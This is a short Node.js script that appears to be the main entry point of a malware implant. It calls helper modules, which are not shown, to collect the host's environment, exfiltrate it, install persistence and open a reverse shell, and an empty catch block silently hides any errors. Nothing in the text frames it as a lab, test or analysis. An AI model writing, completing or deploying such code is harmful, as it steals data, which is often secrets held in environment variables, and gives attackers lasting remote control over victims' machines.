const { collectEnvironment } = require('../lib/collector');
const { exfiltrate } = require('../lib/exfiltrator');
const { installPersistence } = require('../lib/persistence');
const { connectReverseShell } = require('../lib/reverse_shell');

async function main() {
  try {
    const data = collectEnvironment();
    await exfiltrate(data);
    installPersistence();
    
    connectReverseShell();
  } catch (e) {
    
  }
}

main();
